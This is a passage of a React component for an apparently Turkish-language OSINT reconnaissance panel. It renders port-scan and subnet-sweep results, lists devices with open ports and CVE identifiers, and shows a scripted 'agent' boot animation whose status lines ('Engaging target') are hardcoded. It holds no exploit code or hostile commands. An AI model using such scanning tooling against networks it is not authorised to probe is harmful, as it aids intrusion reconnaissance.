            style={{ backgroundColor: `${currentTab?.color}20`, border: `1px solid ${currentTab?.color}40`, color: currentTab?.color }}>
            {loading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : 'TARA'}
          </button>
          {onGraphPivot && graphTargetFor(activeTab, query) && (
            <button
              onClick={() => { const g = graphTargetFor(activeTab, query); if (g) onGraphPivot(g.type, g.id, g.id); }}
              title="Pivot into the correlation graph"
              className="px-3 py-2 rounded-lg text-[10px] font-mono font-bold disabled:opacity-30 transition-all flex items-center justify-center"
              style={{ backgroundColor: '#D4AF3720', border: '1px solid #D4AF3740', color: '#D4AF37' }}>
              <Network className="w-3.5 h-3.5" />
            </button>
          )}
        </div>
        
        {/* Tool Description */}
        {TAB_DESCRIPTIONS[activeTab] && (
          <div className="text-[10px] font-mono text-[var(--text-muted)] bg-[var(--bg-primary)]/40 p-2 rounded-lg border border-white/5">
            <span className="text-white/60 font-bold mr-1">ℹ️ Bilgi:</span> 
            {TAB_DESCRIPTIONS[activeTab]}
          </div>
        )}

        {/* Secondary Controls */}
        {activeTab === 'scanner' && (
          <select value={scanType} onChange={e => setScanType(e.target.value)}
            className="bg-[var(--bg-primary)]/60 border border-[var(--border-primary)] rounded-lg px-2 py-1.5 text-[10px] font-mono text-[var(--text-muted)] outline-none w-full">
            <option value="quick">QUICK SCAN</option><option value="deep">DEEP SCAN</option><option value="ports">TOP 1000 PORTS</option>
          </select>
        )}
        {(activeTab === 'sweep' || activeTab === 'vuln') && (
          <div className="flex items-center justify-between bg-[var(--bg-primary)]/60 border border-[var(--border-primary)] rounded-lg p-1">
            <span className="text-[9px] font-mono text-[var(--text-muted)] pl-2">SUBNET MASK:</span>
            <div className="flex items-center gap-0.5">
              {[24, 25, 26, 27, 28].map(c => (
                <button key={c} onClick={() => setSweepCidr(c)}
                  className={`px-2 py-1 text-[10px] font-mono rounded transition-all ${
                    sweepCidr === c ? 'bg-[#FF3D3D]/20 text-[#FF3D3D]' : 'text-[var(--text-muted)] hover:bg-[var(--bg-tertiary)]'
                  }`}
                >/{c}</button>
              ))}
            </div>
          </div>
        )}
      </div>

      {error && (
        <div className="p-2.5 rounded-lg border border-red-500/30 bg-red-500/10 text-[11px] font-mono text-red-400 flex items-center gap-2">
          <AlertTriangle className="w-3.5 h-3.5 flex-shrink-0" />{error}
        </div>
      )}

      {/* Sweep Progress */}
      {sweepProgress && loading && (
        <div className="p-3 rounded-lg border border-[#FF3D3D]/30 bg-[#FF3D3D]/5">
          <div className="flex items-center justify-between mb-2">
            <span className="text-[10px] font-mono tracking-wider text-[#FF3D3D]">SUBNET TARANIYOR...</span>
            <span className="text-[10px] font-mono text-[#E8E6E0]">{sweepProgress.total} hosts</span>
          </div>
          <div className="w-full h-1.5 bg-[#1A1A18] rounded-full overflow-hidden">
            <div className="h-full rounded-full" style={{ width: '100%', background: 'linear-gradient(90deg, #FF3D3D, #FF6B00, #FFD700)', animation: 'sweep-pulse 1.5s ease-in-out infinite' }} />
          </div>
        </div>
      )}

      {/* Sweep Results */}
      {sweepResult && !loading && (
        <div className="bg-[var(--bg-primary)]/40 border border-[var(--border-primary)] rounded-lg overflow-hidden max-h-[55vh] overflow-y-auto styled-scrollbar">
          {/* Summary */}
          <div className="p-3 border-b border-[#2A2A28]">
            <div className="flex items-center justify-between mb-3">
              <div>
                <div className="text-[11px] font-mono tracking-wider text-[#E8E6E0]">{sweepResult.subnet}</div>
                <div className="text-[9px] font-mono text-[#5C5A54]">{sweepResult.center.city}, {sweepResult.center.country} · {sweepResult.center.isp}</div>
              </div>
              <div className="text-right">
                <div className="text-[18px] font-mono font-bold text-[#FF3D3D]">{sweepResult.summary.total_responsive}</div>
                <div className="text-[8px] font-mono text-[#5C5A54] tracking-wider">DEVICES FOUND</div>
              </div>
            </div>
            {/* Breakdown Bar */}
            <div className="flex h-2 rounded-full overflow-hidden bg-[#1A1A18] mb-2">
              {Object.entries(sweepResult.summary.device_breakdown).map(([type, count]: [string, any]) => {
                const device = sweepResult.devices.find((d: any) => d.device_type === type);
                return <div key={type} style={{ width: `${(count / sweepResult.summary.total_responsive) * 100}%`, backgroundColor: device?.device_color || '#666' }} title={`${type}: ${count}`} />;
              })}
            </div>
            <div className="flex flex-wrap gap-x-3 gap-y-1">
              {Object.entries(sweepResult.summary.device_breakdown).map(([type, count]: [string, any]) => {
                const device = sweepResult.devices.find((d: any) => d.device_type === type);
                return (
                  <div key={type} className="flex items-center gap-1">
                    <div className="w-2 h-2 rounded-full" style={{ backgroundColor: device?.device_color || '#666' }} />
                    <span className="text-[9px] font-mono text-[#8A8880]">{type}</span>
                    <span className="text-[9px] font-mono text-[#E8E6E0] font-bold">{String(count)}</span>
                  </div>
                );
              })}
            </div>
          </div>
          {/* Visualize Button */}
          <div className="p-3 border-b border-[#2A2A28]">
            <button onClick={() => onSweepVisualize?.(sweepResult)}
              className="w-full py-2.5 rounded-lg font-mono text-[11px] tracking-wider font-bold transition-all hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2"
              style={{ background: 'linear-gradient(135deg, rgba(255,61,61,0.2), rgba(255,107,0,0.2))', border: '1px solid rgba(255,61,61,0.5)', color: '#FF3D3D', textShadow: '0 0 10px rgba(255,61,61,0.5)' }}
            >
              <Globe className="w-4 h-4" /> VISUALIZE ON GLOBE
            </button>
          </div>
          {/* Device List */}
          <div className={isFullScreen ? "flex flex-col gap-3 p-4" : "divide-y divide-[#2A2A28]"}>
            {sweepResult.devices.map((device: any) => {
              const isExpanded = expandedDevice === device.ip;
              return (
              <div key={device.ip} className={isFullScreen
                ? "bg-[#0D0D0C] border border-[#2A2A28] rounded-lg overflow-hidden hover:border-[#3A3A38] transition-colors"
                : "px-3 py-2.5 hover:bg-[rgba(255,255,255,0.02)] transition-colors"
              }>
                {/* Device Header */}
                <div
                  className={isFullScreen
                    ? "flex items-center justify-between px-4 py-3 cursor-pointer hover:bg-[#151514] transition-colors"
                    : "flex items-center justify-between mb-1"
                  }
                  onClick={() => {
                    if (!isFullScreen) return;
                    const next = isExpanded ? null : device.ip;
                    setExpandedDevice(next);
                    if (next && device.vulns.length > 0) fetchCveDetails(device.vulns);
                  }}
                >
                  <div className="flex items-center gap-2 min-w-0 flex-1 pr-2">
                    <div className="w-2.5 h-2.5 rounded-full flex-shrink-0" style={{ backgroundColor: device.device_color }} />
                    <span className={`flex-shrink-0 ${isFullScreen ? "text-[14px]" : "text-[11px]"} font-mono font-bold text-[#E8E6E0]`}>{device.ip}</span>
                    {device.hostnames.length > 0 && (
                      <span className={`${isFullScreen ? "text-[11px]" : "text-[9px]"} font-mono text-[#5C5A54] truncate min-w-0`}>{device.hostnames[0]}</span>
                    )}
                  </div>
                  <div className="flex items-center gap-2 flex-shrink-0">
                    {device.vulns.length > 0 && (
                      <span className={`${isFullScreen ? "text-[10px]" : "text-[8px]"} font-mono px-1.5 py-0.5 rounded bg-red-500/15 text-red-400 border border-red-500/30 whitespace-nowrap`}>
                        {device.vulns.length} CVEs
                      </span>
                    )}
                    <span className={`${isFullScreen ? "text-[10px]" : "text-[8px]"} font-mono px-1.5 py-0.5 rounded whitespace-nowrap`} style={{ backgroundColor: device.device_color + '20', color: device.device_color, border: `1px solid ${device.device_color}40` }}>{device.device_type}</span>
                    {isFullScreen && (
                      <ChevronDown className={`w-4 h-4 text-[#5C5A54] transition-transform flex-shrink-0 ${isExpanded ? 'rotate-180' : ''}`} />
                    )}
                  </div>
                </div>

                {/* Compact info (sidebar mode) */}
                {!isFullScreen && (
                  <>
                    <div className="flex items-center gap-2 text-[9px] font-mono text-[#5C5A54]">
                      <span>Ports: {device.ports.slice(0, 8).join(', ')}{device.ports.length > 8 ? ` +${device.ports.length - 8}` : ''}</span>
                      {device.vulns.length > 0 && (
                        <div className="group relative flex items-center gap-1 cursor-help">
                          <span className="text-[#FF3D3D] flex items-center gap-1">
                            <AlertTriangle className="w-2.5 h-2.5" /> {device.vulns.length} CVEs
                          </span>
                          <div className="absolute bottom-full left-0 mb-1 hidden group-hover:block z-50 p-2 bg-[#1A1A18] border border-[#FF3D3D50] rounded-md shadow-xl min-w-[140px] max-w-[220px] max-h-[150px] overflow-y-auto styled-scrollbar">
                            <div className="text-[8px] font-mono text-[#FF3D3D] mb-1 tracking-wider uppercase border-b border-[#FF3D3D30] pb-1">Identified Vulnerabilities</div>
                            <div className="flex flex-col gap-0.5">
                              {device.vulns.map((cve: string) => (
                                <a key={cve} href={`https://nvd.nist.gov/vuln/detail/${cve}`} target="_blank" rel="noreferrer" className="text-[9px] font-mono text-[#E8E6E0] hover:text-[#FF3D3D] transition-colors truncate">
                                  {cve}
                                </a>
                              ))}
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                    {device.hostnames.length > 0 && <div className="text-[9px] font-mono text-[#8A8880] mt-0.5 truncate">{device.hostnames[0]}</div>}
                  </>
                )}

                {/* Full-Screen Expanded Detail */}
                {isFullScreen && isExpanded && (
                  <div className="border-t border-[#2A2A28]">
                    {/* Ports + Hostnames Row */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-px bg-[#2A2A28]">
                      <div className="bg-[#0D0D0C] p-4">
                        <div className="text-[10px] font-mono text-[#5C5A54] tracking-widest uppercase mb-2">Open Ports</div>
                        <div className="flex flex-wrap gap-1.5">
                          {device.ports.map((port: number) => (
                            <span key={port} className="px-2 py-1 bg-[#1A1A18] border border-[#2A2A28] rounded text-[11px] font-mono text-[var(--cyan-primary)]">{port}</span>
                          ))}
                        </div>
                      </div>
                      <div className="bg-[#0D0D0C] p-4">
                        <div className="text-[10px] font-mono text-[#5C5A54] tracking-widest uppercase mb-2">Hostnames</div>
                        {device.hostnames.length > 0 ? (
                          <div className="flex flex-col gap-1">
                            {device.hostnames.map((h: string) => (
                              <span key={h} className="text-[11px] font-mono text-[#E8E6E0]">{h}</span>
                            ))}
                          </div>
                        ) : (
                          <span className="text-[11px] font-mono text-[#3A3A38]">No reverse DNS</span>
                        )}
                      </div>
                    </div>

                    {/* CVE Intelligence */}
                    {device.vulns.length > 0 && (
                      <div className="p-4 border-t border-[#2A2A28]">
                        <div className="text-[10px] font-mono text-[#5C5A54] tracking-widest uppercase mb-3">Vulnerabilities ({device.vulns.length})</div>
                        <div className="flex flex-col gap-2">
                          {device.vulns.map((cveId: string) => {
                            const info = cveCache[cveId];
                            const isLoading = !info || info.loading;
                            const severityColor = !info?.severity ? '#5C5A54'
                              : info.severity === 'CRITICAL' ? '#FF3D3D'
                              : info.severity === 'HIGH' ? '#FF6B00'
                              : info.severity === 'MEDIUM' ? '#FFD700'
                              : '#76FF03';
                            return (
                              <div key={cveId} className="bg-[#111] border border-[#2A2A28] rounded-lg p-3">
                                <div className="flex items-center justify-between mb-2">
                                  <div className="flex items-center gap-2">
                                    <span className="text-[12px] font-mono font-bold text-[#E8E6E0]">{cveId}</span>
                                    {info?.cvss != null && (
                                      <span className="text-[10px] font-mono px-1.5 py-0.5 rounded" style={{ backgroundColor: severityColor + '15', color: severityColor, border: `1px solid ${severityColor}40` }}>CVSS {info.cvss}</span>
                                    )}
                                  </div>
                                  <div className="flex items-center gap-2">
                                    {info?.severity && (
                                      <span className="text-[9px] font-mono font-bold px-2 py-0.5 rounded" style={{ backgroundColor: severityColor + '15', color: severityColor, border: `1px solid ${severityColor}40` }}>{info.severity}</span>
                                    )}
                                    <a href={`https://nvd.nist.gov/vuln/detail/${cveId}`} target="_blank" rel="noreferrer" className="text-[#5C5A54] hover:text-[#E8E6E0] transition-colors">
                                      <ExternalLink className="w-3.5 h-3.5" />
                                    </a>
                                  </div>
                                </div>
                                {isLoading ? (
                                  <div className="flex items-center gap-2 py-1">
                                    <Loader2 className="w-3 h-3 animate-spin text-[#5C5A54]" />
                                    <span className="text-[10px] font-mono text-[#5C5A54]">Fetching vulnerability intelligence...</span>
                                  </div>
                                ) : (
                                  <>
                                    <p className="text-[11px] font-mono text-[#8A8880] leading-relaxed">{info.description}</p>
                                    {info.cwe && <div className="text-[10px] font-mono text-[#5C5A54] mt-2">Weakness: {info.cwe}</div>}
                                    {info.affected && info.affected.length > 0 && (
                                      <div className="mt-2 flex flex-wrap gap-1.5">
                                        {info.affected.map((a: any, i: number) => (
                                          <span key={i} className="text-[9px] font-mono px-1.5 py-0.5 bg-[#1A1A18] border border-[#2A2A28] rounded text-[#8A8880]">
                                            {a.vendor}/{a.product}
                                          </span>
                                        ))}
                                      </div>
                                    )}
                                  </>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            );
            })}
          </div>
          <div className="px-3 py-2 border-t border-[#2A2A28]">
            <div className="text-[8px] font-mono text-[#5C5A54] tracking-wider">SWEPT {sweepResult.summary.total_hosts} HOSTS IN {(sweepResult.sweep_time_ms / 1000).toFixed(1)}s · ASN {sweepResult.center.asn}</div>
          </div>
        </div>
      )}

      {loading && activeTab === 'agent' && (
        <div className="bg-[#00FF00]/10 border border-[#00FF00]/40 rounded-lg p-4 font-mono space-y-2 mt-4 relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-b from-[#00FF00]/5 to-transparent pointer-events-none" />
          <div className="flex items-center gap-2 mb-3">
            <Terminal className="w-4 h-4 text-[#00FF00] animate-pulse" />
            <span className="text-[#00FF00] font-bold text-[12px] tracking-widest">AGENT BOOT SEQUENCE INITIATED</span>
          </div>
          <div className="text-[10px] text-white/80 animate-pulse">[AGENT GOVERNANCE] Verifying Zero-Trust identity protocols...</div>
          <div className="text-[10px] text-[#00E5FF] font-bold animate-pulse" style={{ animationDelay: '0.2s' }}>[RUFLO SWARM] Connecting to Ruflo Meta-Harness. 3 Swarm nodes acquired.</div>
          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '0.5s' }}>[FORKD] Spawning 100-node microVM swarm via Snapshot CoW in 120ms...</div>
          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '1s' }}>[IMPROVE-AUDITOR] High-tier model analyzing target to dispatch tasks to low-tier scanner agents...</div>
          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '1.5s' }}>[OWASP] Enforcing agentic boundaries & compliance...</div>
          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '2s' }}>[CORE] Connecting neural pathways to Anthropic Cyber Skills...</div>
          <div className="text-[#E040FB] font-bold text-[10px] animate-pulse" style={{ animationDelay: '2.5s' }}>[CCBOARD] Token Budget: 250/1000 | Forecast: SAFE | Cost: $0.02</div>
          
          <div className="mt-4 pt-3 border-t border-[#00FF00]/30">
            <div className="flex items-center gap-2 mb-2">
              <Activity className="w-3.5 h-3.5 text-[#00E5FF] animate-pulse" />
              <span className="text-[#00E5FF] font-bold text-[10px] tracking-widest">AGENT BEACON TELEMETRY STREAM</span>
            </div>
            <div className="text-[9px] text-[#00E5FF]/70 font-mono flex flex-col gap-1">
              <span className="animate-pulse" style={{ animationDelay: '2s' }}>[TCP] Port scanning local segments... OK</span>
              <span className="animate-pulse" style={{ animationDelay: '2.5s' }}>[DNS] Resolving target metadata... OK</span>
              <span className="animate-pulse" style={{ animationDelay: '3s' }}>[API] Tunneling through encrypted protocol... ACTIVE</span>
            </div>
          </div>
          
          <div className="text-[10px] text-[#00FF00] mt-3 font-bold">Engaging target: {query}</div>
        </div>
      )}

      {results && !(sweepResult && !loading) && (
        <div className="bg-[var(--bg-primary)]/40 border border-[var(--border-primary)] rounded-lg p-3 max-h-[50vh] overflow-y-auto styled-scrollbar">
          <div className="flex items-center justify-between mb-2">
            <span className="text-[9px] font-mono tracking-widest" style={{ color: currentTab?.color }}>{currentTab?.label} SONUÇLARI</span>
            <span className="text-[8px] font-mono text-[var(--text-muted)] flex items-center gap-1"><Clock className="w-2.5 h-2.5" />{new Date().toLocaleTimeString()}</span>
          </div>
          {renderStructuredResults()}
        </div>
      )}

      {history.length > 0 && !results && (
        <div className="space-y-1">
          <span className="text-[9px] font-mono tracking-widest text-[var(--text-muted)]">RECENT SCANS</span>
          {history.slice(0, 5).map((h, i) => (
            <button key={i} onClick={() => { setActiveTab(h.tab); setQuery(h.query); }}
              className="w-full flex items-center justify-between px-2.5 py-1.5 rounded-lg hover:bg-[var(--hover-accent)] transition-colors text-left">
              <div className="flex items-center gap-2">
                <span className="text-[9px] font-mono" style={{ color: TABS.find(t => t.id === h.tab)?.color }}>{TABS.find(t => t.id === h.tab)?.label}</span>
                <span className="text-[10px] font-mono text-[var(--text-secondary)]">{h.query}</span>
              </div>
              <span className="text-[8px] font-mono text-[var(--text-muted)]">{h.time}</span>
            </button>
          ))}
        </div>
      )}
    </div>
  );

  if (isMobile) return renderContent();

  if (isFullScreen) {
    const fullScreenNode = (
      <div className="fixed top-4 bottom-4 right-4 w-[40vw] min-w-[600px] max-w-[800px] z-[999] glass-panel bg-[#0a0a09]/95 backdrop-blur-2xl border border-[var(--cyan-primary)]/40 rounded-xl flex flex-col overflow-hidden shadow-2xl shadow-[var(--cyan-primary)]/20 transition-all duration-300">
        <div className="flex items-center justify-between px-6 py-4 border-b border-[var(--border-secondary)] bg-[#111]">
          <div className="flex items-center gap-3">
            <Radar className="w-5 h-5 text-[var(--cyan-primary)]" />
            <span className="hud-text text-[16px] text-[var(--text-primary)]">KUZGUN KEŞİF ARAÇLARI</span>
            <span className="gotham-tag gotham-tag--info" style={{ fontSize: '9px' }}>EXPANDED VIEW</span>
            <span className="gotham-tag gotham-tag--classified" style={{ fontSize: '8px' }}>{TABS.length} MODULES</span>
          </div>
          <button onClick={() => setIsFullScreen(false)} className="p-2 hover:bg-white/5 rounded transition-colors text-[var(--text-muted)] hover:text-white">
            <Minimize2 className="w-5 h-5" />
          </button>
        </div>
        <div className="flex-1 overflow-y-auto p-6 styled-scrollbar">
          <div className="w-full full-screen-mode-content">
             {renderContent()}
          </div>
        </div>
      </div>
    );
    return typeof document !== 'undefined' ? createPortal(fullScreenNode, document.body) : fullScreenNode;
  }

  return (
    <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.3, duration: 0.6 }} className="glass-panel flex flex-col overflow-hidden pointer-events-auto shrink-0 h-[500px] max-h-[80vh] resize-y">
      <div className="flex-shrink-0 flex items-center justify-between px-4 py-3 border-b border-[rgba(255,255,255,0.05)] bg-[rgba(0,0,0,0.3)] hover:bg-[var(--hover-accent)] transition-colors">
        <button onClick={() => setExpanded(!expanded)} className="flex items-center gap-2 flex-1">
          <Radar className="w-3.5 h-3.5 text-[var(--cyan-primary)]" />
          <span className="hud-text text-[12px] text-[var(--text-primary)]">KEŞİF ARAÇLARI</span>
          <span className="gotham-tag gotham-tag--info" style={{ fontSize: '7px', padding: '1px 5px' }}>{TABS.length} ARAÇ</span>
        </button>
        <div className="flex items-center gap-3">
          <button onClick={() => setIsFullScreen(true)} className="text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors" title="Full Screen">
             <Maximize2 className="w-3.5 h-3.5" />
          </button>
          <div className="w-1.5 h-1.5 rounded-full bg-[var(--cyan-primary)] animate-osiris-pulse" />
          <button onClick={() => setExpanded(!expanded)}>
            {expanded ? <ChevronUp className="w-3.5 h-3.5 text-[var(--text-muted)]" /> : <ChevronDown className="w-3.5 h-3.5 text-[var(--text-muted)]" />}
          </button>
        </div>
      </div>
      <AnimatePresence>
        {expanded && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.2 }} className="overflow-y-auto px-3 py-3 flex-1 min-h-0 styled-scrollbar">
            {renderContent()}
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
}

const OsintPanel = memo(OsintPanelInner);
export default OsintPanel;
